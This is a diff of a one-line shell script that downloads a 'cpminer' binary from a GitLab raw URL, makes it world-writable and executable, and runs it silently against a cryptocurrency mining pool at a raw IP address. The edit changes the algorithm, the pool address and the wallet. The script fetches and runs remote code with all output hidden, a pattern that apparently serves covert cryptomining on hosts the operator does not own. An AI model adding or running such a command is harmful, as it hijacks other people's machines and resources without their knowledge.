@@ -1,3 +1,3 @@
 #!/bin/sh
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://167.71.106.61:80 -u shuga1qk2xeu9l86rw6hwjfezfs3dpy3zcfms0svh9j96 -t4 -p m=solo > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QQuVuBF9yLgdE4C3HuhyxD5rk1wTMwg45F -t4 -p m=solo > /dev/null 2>&1
